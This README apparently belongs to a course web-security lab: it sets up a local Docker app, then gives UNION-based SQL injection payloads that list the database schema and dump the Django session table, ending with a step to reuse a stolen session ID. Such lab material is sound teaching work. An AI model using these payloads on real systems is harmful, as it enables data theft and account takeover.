# CN351-webSec

## SetUp project in visual machine
1. Clone project from github
2. Install docker and docker-compose
```bash
$ sudo apt install docker.io
$ sudo systemctl enable docker --now
$ sudo usermod -aG docker $USER

$ sudo apt install docker-compose
```
3. Run docker-compose up -d
```bash
$ docker-compose up -d
```
4. setup requirement
```bash
$ sudo apt install pkg-config
$ sudo apt install python3-venv
$ sudo apt install python3-dev

$ python3 -m venv .venv
$ source .venv/bin/activate
$ pip install -r requirements.txt
```

## SQL Injection
1. Go to http://localhost:8000/?search=
2. Try to search with SQL Injection Example:
```url
/?search=' UNION SELECT table_schema,  table_name, NULL, NULL, NULL FROM information_schema.table_constraints;
/?search=' UNION SELECT *, NULL, NULL FROM db_websec.django_session;
```
3. Change sessionid to sessionid in django_session table